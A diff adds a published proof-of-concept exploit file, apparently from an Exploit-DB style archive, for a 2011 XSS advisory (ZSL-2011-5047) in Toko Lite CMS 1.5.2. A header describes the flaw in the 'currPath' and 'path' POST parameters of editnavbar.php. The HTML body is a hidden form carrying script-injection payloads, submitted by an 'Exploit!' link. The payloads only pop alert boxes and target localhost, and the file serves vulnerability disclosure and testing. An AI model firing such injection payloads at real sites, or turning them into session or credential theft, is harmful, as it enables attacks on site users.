@@ -1,0 +1,54 @@
+<!--
+
+
+Toko Lite CMS 1.5.2 (EditNavBar.php) Multiple Parameters XSS POST Injection
+
+
+Vendor: Toko
+Product web page: http://toko-contenteditor.pageil.net
+Affected version: 1.5.2
+
+Summary: Toko Web Content Editor cms is a compact, multi language, open
+source web editor and content management system (CMS). It is advanced
+easy to use yet fully featured program that can be integrated with any
+existing site. It takes 2 minuets to install even for non technical users.
+
+Desc: Toko CMS suffers from a XSS vulnerability when parsing user input
+to the 'currPath' and 'path' parameters via POST method in 'editnavbar.php'.
+Attackers can exploit this weakness to execute arbitrary HTML and script
+code in a user's browser session.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2011-5047
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5047.php
+
+
+22.03.2011
+
+-->
+
+
+
+<html>
+<title>Toko Lite CMS 1.5.2 (EditNavBar.php) Multiple Parameters XSS POST Injection</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">
+function xss(){document.forms["xss"].submit();}
+</script>
+<br /><br />
+<form action="http://localhost/tokolite1.5.2/editnavbar.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="currPath" value='"><script>alert(1)</script>' />
+<input type="hidden" name="path" value='"><script>alert(2)</script>' />
+</form>
+<a href="javascript: xss();" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit!</h3></center></font></b></a><br /><br />
+</body></html>
